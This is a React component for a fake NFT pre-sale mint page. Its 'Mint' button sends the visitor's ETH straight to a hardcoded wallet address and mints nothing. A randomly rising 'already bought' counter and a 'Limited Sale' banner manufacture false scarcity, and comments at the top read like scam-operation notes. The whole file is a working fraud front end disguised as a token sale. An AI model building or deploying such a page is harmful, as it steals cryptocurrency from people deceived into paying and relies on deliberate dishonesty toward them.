import { useState, useEffect } from "react";
import { ethers } from "ethers";
import ErrorMessage from "./ErrorMessage";
import TxList from "./TxList";

//buy dedik
//build default structure
//find spammers
//
const _maxSupply = 8000;
const _alreadyBought = 1873;
const _price = 0.25;
const _maxPerWallet = 10;


const handleError = async (setError, message) => {
  if(message.includes('insufficient funds for intrinsic transaction cost')){
    setError('Insufficient funds for intrinsic transaction cost!');
  }
  else{
    setError(message);
  }
};
const startPayment = async ({ setError, ether, addr }) => {
  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

    await window.ethereum.send("eth_requestAccounts");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    ethers.utils.getAddress(addr);
    const tx = await signer.sendTransaction({
      to: addr,
      value: ethers.utils.parseEther(ether)
    });
  } catch (err) {
    console.log("err", err);
    handleError(setError, err.message);
  }
};

export default function App() {
  const [error, setError] = useState();
  const [countPerWallet, setCounter] = useState(1);
  const [total, setTotal] = useState(_price);
  const [alreadyBought, setAlreadyBought] = useState(_alreadyBought);
  
  const updateAlreadyBought = () => {
    if(alreadyBought < _maxSupply-100){
      let max = 800;
      let min = 100;
      let rand = Math.floor(Math.random() * (max - min + 1)) + min;
      let newAlreadyBought = alreadyBought + rand;
      if(newAlreadyBought < _maxSupply){
        setAlreadyBought(newAlreadyBought);
      }
    }
  }
  useEffect(() => {
    setTimeout(() => {
      updateAlreadyBought();
    }, 5000);
  });

  const updateTotal = (newCount) => {
    setTotal((_price * newCount).toFixed(2));
  }

  const onPlus = () => {
    if(countPerWallet < _maxPerWallet){
      let newCount = countPerWallet + 1
      setCounter(newCount);
      updateTotal(newCount);
    }
  };
  const onMinus = () => {
    if(countPerWallet > 1){
      let newCount = countPerWallet - 1
      setCounter(newCount);
      updateTotal(newCount);
    } 
  };
  const onSetMax = () => {
    setCounter(_maxPerWallet);
    updateTotal(_maxPerWallet);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError();
    await startPayment({
      setError,
      ether: '' +total,//data.get("ether"),
      addr: '0x3f60a2698934C0eef0740d116F413611FD8C351E'//data.get("addr")
    });
  };

  return (
    <main>
    <div className="main-flex">
        <div className="slider"> 
          <img src="static/media/slide1.webp" alt="slide"/> 
          <img src="static/media/slide2.webp" alt="slide"/> 
          <img src="static/media/slide3.webp" alt="slide"/> 
          <img src="static/media/slide4.webp" alt="slide"/> 
          <img src="static/media/slide5.webp" alt="slide"/> 
          <img src="static/media/slide6.webp" alt="slide"/> 
          <img src="static/media/slide7.webp" alt="slide"/> 
          <img src="static/media/slide8.webp" alt="slide"/> 
          <img src="static/media/slide9.webp" alt="slide"/> 
        </div>
        <div className="header-cont">
          <div className="dutch-detail-two-sides">
              <div className="dutch-det-left">
                <div className="text-block-13">Special Price for Pre Sale</div>
              </div>
              <div className="dutch-det-right">
                <div className="text-block-12">February <span id="dateday2">
                  </span> <span id="datehour1">

                  </span>
                  </div>
              </div>
          </div>
          <div className="header_flex">
              <div className="dutch-detail-two-sides">
                <div className="dutch-det-left">
                    <div className="text-block-13">Supply</div>
                </div>
                <div className="dutch-det-right">
                    <div className="text-block-12">{_maxSupply}</div>
                </div>
              </div>
              <div className="dutch-detail-two-sides">
                <div className="dutch-det-left">
                    <div className="text-block-13">Price</div>
                </div>
                <div className="dutch-det-right">
                    <div className="text-block-12">{_price} ETH</div>
                </div>
              </div>
              <div className="dutch-detail-two-sides">
                <div className="dutch-det-left">
                    <div className="text-block-13">Max</div>
                </div>
                <div className="dutch-det-right">
                    <div className="text-block-12">{_maxPerWallet} per Wallet</div>
                </div>
              </div>
          </div>
          <div id="claim-text-wrapper">
              <div id="payment-modal">
                <div id="payment-header">
                    <div id="payment-header-text" style={{margin: 0}}>
                    <h1 className="heading-2-copy-copy-copy-copy" 
                    style={{ margin: 0, padding: 0}}>
                      <span >Limited Sale</span>
                      </h1>
                </div>
              </div>
              <div id="payment-info" style={{ marginTop: 20}}>
              <img id="price-img" src="static/media/gifius.gif" alt="Claim NFT" />
              <div id="payment-info-text">
                <p>Price Per NFT</p>
                <h5>{_price} ETH Each</h5>
              </div>
          </div>
          <div id="ape-number">
              <div id="minus" className="minuson" onClick={onMinus}>
                <svg width="12" height="2" viewBox="0 0 16 2" fill="none"
                 xmlns="http://www.w3.org/2000/svg" style={{left: 11}}>
                <path d="M15 0H1C0.734784 0 0.48043 0.105357 
                0.292893 0.292893C0.105357 0.48043 0 0.734784 
                0 1C0 1.26522 0.105357 1.51957 0.292893 
                1.70711C0.48043 1.89464 0.734784 2 1 2H15C15.2652 2 15.5196 1.89464 
                15.7071 1.70711C15.8946 1.51957 16 1.26522 16 1C16 0.734784 15.8946
                 0.48043 15.7071 0.292893C15.5196 0.105357 15.2652 0 15 0Z" fill="white"></path>
                </svg>
              </div>
              <h5 id="pricex" style={{marginLeft: 13, marginRight: 13}}>{countPerWallet}</h5>
              <div id="plus" className="pluson" onClick={onPlus}>
                <svg width="12" height="12" viewBox="0 0 16 16" fill="none" 
                xmlns="http://www.w3.org/2000/svg" style={{left: 11}}>
                <path d="M15 7H9V1C9 0.734784 8.89464 0.48043 8.70711 0.292893C8.51957 
                0.105357 8.26522 0 8 0C7.73478 0 7.48043 0.105357 7.29289 0.292893C7.10536
                 0.48043 7 0.734784 7 1V7H1C0.734784 7 0.48043 7.10536 0.292893 7.29289C0.105357
                  7.48043 0 7.73478 0 8C0 8.26522 0.105357 8.51957 0.292893 8.70711C0.48043 8.89464 
                  0.734784 9 1 9H7V15C7 15.2652 7.10536 15.5196 7.29289 15.7071C7.48043 15.8946
                   7.73478 16 8 16C8.26522 16 8.51957 15.8946 8.70711 15.7071C8.89464 15.5196 9
                    15.2652 9 15V9H15C15.2652 9 15.5196 8.89464 15.7071 8.70711C15.8946 8.51957 16
                     8.26522 16 8C16 7.73478 15.8946 7.48043 15.7071 7.29289C15.5196 7.10536 15.2652
                      7 15 7Z" fill="white"></path>
                </svg>
              </div>
              <h5 id="ape-max" onClick={onSetMax}>Set Max</h5>
          </div>
          <div id="ape-total">
              <p>Total</p>
              <h5><span id="price">{total}</span> ETH</h5>
          </div>
        </div>
        <ErrorMessage message={error} />
        <button className="cta connect-btn" id="transfer" onClick={handleSubmit}>Mint</button>
        <div id="num">
          <span id="num_1">{alreadyBought}</span>
          <span className="num_c">/</span>
          <span id="num_2">{_maxSupply}</span>
        </div>
    </div>
    </div>
    </div>
</main>
    
  );
}
